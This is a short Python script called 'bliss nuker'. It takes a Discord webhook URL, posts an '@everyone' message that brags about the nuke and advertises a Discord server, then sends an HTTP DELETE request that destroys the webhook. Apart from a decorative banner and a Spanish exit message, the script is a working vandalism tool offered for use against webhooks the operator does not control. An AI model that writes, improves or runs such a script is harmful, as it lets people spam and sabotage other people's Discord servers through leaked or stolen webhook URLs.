import os
import requests
from dhooks import Webhook
import time
from termcolor import colored

os.system("title bliss nuker")

def banner():
    print(colored("""
         ▄▄▄▄    ██▓     ██▓  ██████   ██████ 
        ▓█████▄ ▓██▒    ▓██▒▒██    ▒ ▒██    ▒ 
        ▒██▒ ▄██▒██░    ▒██▒░ ▓██▄   ░ ▓██▄   
        ▒██░█▀  ▒██░    ░██░  ▒   ██▒  ▒   ██▒
        ░▓█  ▀█▓░██████▒░██░▒██████▒▒▒██████▒▒
        ░▒▓███▀▒░ ▒░▓  ░░▓  ▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░
        ▒░▒   ░ ░ ░ ▒  ░ ▒ ░░ ░▒  ░ ░░ ░▒  ░ ░
        ░    ░   ░ ░    ▒ ░░  ░  ░  ░  ░  ░  
        ░          ░  ░ ░        ░        ░  
              ░                              
    """, 'magenta'))
    print(colored("		Put your webhook URL: ", 'cyan'))

def bliss():
    start = input(colored("bliss@webhook ~ ", 'magenta'))
    hook = Webhook(start)
    hook.send("@everyone webhook nuked by bliss https://discord.gg/villeros")
    x = requests.delete(start)

def end():
    print("Nukeada por bliss<3\n")
    print("Saliendo en 10 segundos...")
    time.sleep(10)
    os.system("exit")

banner()
bliss()
end()
